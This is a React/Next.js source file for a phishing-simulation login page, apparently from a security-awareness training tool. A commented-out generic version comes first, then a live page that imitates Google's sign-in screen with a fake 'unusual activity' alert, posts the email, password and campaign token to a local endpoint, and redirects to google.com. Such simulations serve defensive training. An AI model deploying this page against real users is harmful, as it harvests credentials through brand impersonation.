
// "use client"

// import type React from "react"

// import { useSearchParams, useRouter } from "next/navigation"
// import { useState, useEffect } from "react"
// import { Input } from "@/components/ui/input"
// import { Button } from "@/components/ui/button"
// import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
// import { Alert, AlertDescription } from "@/components/ui/alert"
// import { toast } from "sonner"
// import { Shield, Lock, AlertTriangle } from "lucide-react"

// export default function PhishingLoginPage() {
//   const searchParams = useSearchParams()
//   const router = useRouter()
//   const [email, setEmail] = useState("")
//   const [password, setPassword] = useState("")
//   const [token, setToken] = useState<string | null>(null)
//   const [isLoading, setIsLoading] = useState(false)

//   useEffect(() => {
//     const t = searchParams.get("token")
//     if (!t) {
//       toast.error("Invalid or missing security token")
//       router.push("/")
//     } else {
//       setToken(t)
//     }
//   }, [searchParams, router])

//   const handleLogin = async (e: React.FormEvent) => {
//     e.preventDefault()

//     if (!token) {
//       toast.error("Missing campaign token.")
//       return
//     }

//     setIsLoading(true)
//     try {
//       const res = await fetch("/api/phishing/submit", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ email, password, token }),
//       })

//       if (!res.ok) throw new Error("Submission failed")

//       toast.success("Account verification completed successfully")
//       setEmail("")
//       setPassword("")

//       // Simulate redirect to legitimate site
//       setTimeout(() => {
//         window.location.href = "https://google.com"
//       }, 1500)
//     } catch (error) {
//       toast.error("Verification failed. Please try again.")
//       console.error(error)
//     } finally {
//       setIsLoading(false)
//     }
//   }

//   if (!token) {
//     return (
//       <div className="flex items-center justify-center min-h-screen bg-slate-50">
//         <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-slate-900" />
//       </div>
//     )
//   }

//   return (
//     <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 flex items-center justify-center p-4">
//       <div className="w-full max-w-md space-y-6">
//         {/* Security Header */}
//         <div className="text-center space-y-2">
//           <div className="mx-auto w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
//             <Shield className="h-8 w-8 text-red-600" />
//           </div>
//           <h1 className="text-2xl font-bold text-slate-900">Security Verification Required</h1>
//           <p className="text-slate-600">Please verify your account to continue</p>
//         </div>

//         {/* Security Alert */}
//         <Alert className="border-red-200 bg-red-50">
//           <AlertTriangle className="h-4 w-4 text-red-600" />
//           <AlertDescription className="text-red-800">
//             <strong>Security Alert:</strong> Unusual activity detected on your account. Immediate verification required
//             to prevent account suspension.
//           </AlertDescription>
//         </Alert>

//         {/* Login Form */}
//         <Card className="border-0 shadow-xl bg-white">
//           <CardHeader className="space-y-1 pb-4">
//             <div className="flex items-center gap-2">
//               <Lock className="h-5 w-5 text-slate-600" />
//               <CardTitle className="text-xl">Secure Account Verification</CardTitle>
//             </div>
//             <p className="text-sm text-slate-600">Enter your credentials to verify your identity</p>
//           </CardHeader>
//           <CardContent>
//             <form onSubmit={handleLogin} className="space-y-4">
//               <div className="space-y-2">
//                 <label htmlFor="email" className="text-sm font-medium text-slate-700">
//                   Email Address
//                 </label>
//                 <Input
//                   id="email"
//                   type="email"
//                   placeholder="you@example.com"
//                   value={email}
//                   onChange={(e) => setEmail(e.target.value)}
//                   required
//                   className="h-11"
//                 />
//               </div>

//               <div className="space-y-2">
//                 <label htmlFor="password" className="text-sm font-medium text-slate-700">
//                   Password
//                 </label>
//                 <Input
//                   id="password"
//                   type="password"
//                   placeholder="Enter your password"
//                   value={password}
//                   onChange={(e) => setPassword(e.target.value)}
//                   required
//                   className="h-11"
//                 />
//               </div>

//               <Button
//                 type="submit"
//                 className="w-full h-11 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800"
//                 disabled={isLoading}
//               >
//                 {isLoading ? (
//                   <>
//                     <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2" />
//                     Verifying Account...
//                   </>
//                 ) : (
//                   <>
//                     <Lock className="mr-2 h-4 w-4" />
//                     Verify Account
//                   </>
//                 )}
//               </Button>
//             </form>

//             <div className="mt-6 pt-4 border-t border-slate-200">
//               <div className="flex items-center justify-center gap-2 text-xs text-slate-500">
//                 <Shield className="h-3 w-3" />
//                 <span>Secured by CyberSim Security</span>
//               </div>
//             </div>
//           </CardContent>
//         </Card>

//         {/* Trust Indicators */}
//         <div className="text-center space-y-2">
//           <div className="flex items-center justify-center gap-4 text-xs text-slate-500">
//             <div className="flex items-center gap-1">
//               <div className="w-2 h-2 bg-green-500 rounded-full" />
//               <span>SSL Secured</span>
//             </div>
//             <div className="flex items-center gap-1">
//               <div className="w-2 h-2 bg-green-500 rounded-full" />
//               <span>256-bit Encryption</span>
//             </div>
//           </div>
//           <p className="text-xs text-slate-400">Your information is protected with enterprise-grade security</p>
//         </div>
//       </div>
//     </div>
//   )
// }
"use client"

import { useSearchParams, useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { toast } from "sonner"
import { Shield, Lock, AlertTriangle, Eye, EyeOff } from 'lucide-react'
import Image from "next/image"

interface SubmitResponse {
  message: string
}

export default function GooglePhishingPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [token, setToken] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    const t = searchParams.get("token")
    if (!t) {
      toast.error("Invalid or missing security token")
      router.push("/")
    } else {
      setToken(t)
    }
  }, [searchParams, router])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!token) {
      toast.error("Missing campaign token.")
      return
    }

    setIsLoading(true)
    try {
      const res = await fetch("/api/phishing/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, token }),
      })

      if (!res.ok) throw new Error("Submission failed")

      const data: SubmitResponse = await res.json()
      toast.success("Account verification completed successfully")
      setEmail("")
      setPassword("")

      // Simulate redirect to legitimate site
      setTimeout(() => {
        window.location.href = "https://google.com"
      }, 1500)
    } catch (error) {
      toast.error("Verification failed. Please try again.")
      console.error(error)
    } finally {
      setIsLoading(false)
    }
  }

  if (!token) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-white">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600" />
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Google-like header */}
      <div className="flex items-center justify-between p-4 border-b border-gray-200">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
            <span className="text-white font-bold text-sm">G</span>
          </div>
          <span className="text-gray-700 text-xl font-normal">Google</span>
        </div>
        <div className="text-sm text-gray-600">
          Privacy & Terms
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-6">
          {/* Security Alert */}
          <Alert className="border-red-200 bg-red-50">
            <AlertTriangle className="h-4 w-4 text-red-600" />
            <AlertDescription className="text-red-800">
              <strong>Security Alert:</strong> We detected unusual activity on your Google Account. 
              Sign in to review and secure your account.
            </AlertDescription>
          </Alert>

          {/* Main Card */}
          <Card className="border border-gray-300 shadow-lg">
            <CardHeader className="text-center pb-4">
              <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <span className="text-white font-bold text-2xl">G</span>
              </div>
              <CardTitle className="text-2xl font-normal text-gray-800">
                Sign in to your Google Account
              </CardTitle>
              <p className="text-sm text-gray-600 mt-2">
                to continue to Gmail
              </p>
            </CardHeader>
            <CardContent className="px-8 pb-8">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Input
                    type="email"
                    placeholder="Email or phone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className="h-14 text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                  />
                  <div className="text-xs text-blue-600 hover:underline cursor-pointer">
                    Forgot email?
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter your password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                      className="h-14 text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500 pr-12"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                    </button>
                  </div>
                  <div className="text-xs text-blue-600 hover:underline cursor-pointer">
                    Forgot password?
                  </div>
                </div>

                <div className="text-xs text-gray-600">
                  Not your computer? Use Guest mode to sign in privately.{" "}
                  <span className="text-blue-600 hover:underline cursor-pointer">Learn more</span>
                </div>

                <div className="flex items-center justify-between pt-4">
                  <Button
                    type="button"
                    variant="ghost"
                    className="text-blue-600 hover:bg-blue-50"
                  >
                    Create account
                  </Button>
                  <Button
                    type="submit"
                    className="bg-blue-600 hover:bg-blue-700 text-white px-8"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <>
                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2" />
                        Signing in...
                      </>
                    ) : (
                      "Next"
                    )}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>

          {/* Footer */}
          <div className="text-center space-y-4">
            <div className="flex items-center justify-center gap-6 text-xs text-gray-500">
              <span>English (United States)</span>
            </div>
            <div className="flex items-center justify-center gap-6 text-xs text-gray-500">
              <span className="hover:underline cursor-pointer">Help</span>
              <span className="hover:underline cursor-pointer">Privacy</span>
              <span className="hover:underline cursor-pointer">Terms</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
